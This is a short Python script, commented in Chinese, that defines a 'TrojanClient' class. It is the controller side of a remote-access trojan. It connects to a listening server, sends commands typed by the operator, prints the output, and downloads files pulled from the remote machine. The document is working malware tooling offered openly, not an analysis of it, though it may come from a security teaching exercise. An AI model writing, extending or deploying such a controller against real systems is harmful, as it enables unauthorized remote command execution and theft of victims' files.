#!/usr/bin/python


import socket
import sys
import os
import re


class TrojanClient:

    def __init__(self, serverIp, serverPort): # 初始化远程连接的服务端IP、端口
        self.serverIp=serverIp
        self.serverPort=serverPort
        self.bufferSize= 10240 # 数据包最大值
    
    def connet(self):
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        except socket.error as e:
            print("创建 socket 错误：%s" %(e))

        try:
            s.connect((self.serverIp, self.serverPort))
            while True:
                msg=input("> ") #获取输入的命令
                if not msg:
                    break
                s.send(bytes(msg,"utf-8")) # 发送命令
                resultData=s.recv(self.bufferSize) # 接收服务端返回的数据
                if not resultData:
                    break
                # 判断数据类型
                if re.search('^0001',resultData.decode('utf-8','ignore')):
                    print(resultData.decode('utf-8')[4:])
                else:
                    s.send('文件传输'.encode())
                    file_total_size=int(resultData.decode()) # 文件大小
                    received_size=0 # 传输大小
                    f=open('new'+os.path.split(msg)[-1],'wb') # 创建文件
                    while received_size < file_total_size: # 写文件
                        data=s.recv(self.bufferSize)
                        f.write(data)
                        received_size +=len(data) # 累加已传输文件的大小
                        print("已传输文件：%s" %(str(received_size)))
                    f.close()# 关闭文件
                    print("传输完毕", file_total_size, received_size)
        except socket.error as e:
            s.close() # 关闭socket
            raise # 退出程序

        finally:
            s.close()

if __name__=='__main__':
    c=TrojanClient('127.0.0.1',18888)
    c.connet()
    sys.exit() #退出进程